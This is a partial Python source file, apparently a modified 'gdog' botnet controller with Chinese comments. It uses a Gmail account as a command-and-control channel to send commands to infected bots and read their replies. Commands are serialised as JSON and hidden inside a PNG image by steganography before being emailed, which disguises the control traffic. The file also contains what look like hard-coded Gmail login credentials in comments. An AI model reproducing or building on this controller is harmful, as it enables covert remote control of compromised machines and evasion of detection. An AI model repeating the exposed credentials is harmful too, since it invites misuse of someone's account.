# coding=utf-8
# in : python gdog.py -id 1 -jobid 2 -cmd 32
"""
...
############################################
# gmail_user = 'lucky1314xy@gmail.com'
# gmail_pwd = 'szmtaqzy'
...
# 生成一个长度为30的随机字符串，然后计算其SHA-256哈希值，并返回作为作业ID
def generateJobID():
    ...
    def getPayloads(self, msg_data):
        ...
        for payload in email.message_from_string(msg_data[1][0][1]).get_payload():
            ...
            if payload.get_content_maintype() == 'text':
                ...
                self.attachment = payload.get_payload()#否则作为附件存储

    def getSubjectHeader(self, msg_data):
        self.subject = email.message_from_string(msg_data[1][0][1])['Subject'] #提取subject头部分

    def getDateHeader(self, msg_data):
        self.date = email.message_from_string(msg_data[1][0][1])['Date']#提取邮件的日期
...
class Gdog:
    ...
    def __init__(self):
        ...
        self.c = imaplib.IMAP4_SSL(imap_server)
        self.c.login(gmail_user, gmail_pwd)

    # 构建邮件内容，包括主题、命令信息等，并将其发送给Gmail账户
    def sendEmail(self, botid, jobid, cmd, arg='', attachment=[]):
        ...
        #msgtext：创建一个包含命令（cmd）和参数（arg）的 JSON 字符串。
        msgtext = json.dumps({'cmd': cmd, 'arg': arg})
        #添加到邮件的中文中
        #msg.attach(MIMEText(str(msgtext)))
        filename = "command_msgtext.txt"
        with open(filename, 'w') as file:
            file.write(msgtext)
        payload = "command_msgtext.txt"
        input = "Lyf.png"
        output = "After_Lyf.png"
        png_encode(payload, input, output)
        if os.path.exists(output) == True:
            part = MIMEBase('image', output.split('.')[-1])
            part.set_payload(open(output, 'rb').read())
            Encoders.encode_base64(part)
            part.add_header('Content-Disposition', 'attachment; filename="{}"'.format(os.path.basename(output)))
            msg.attach(part)
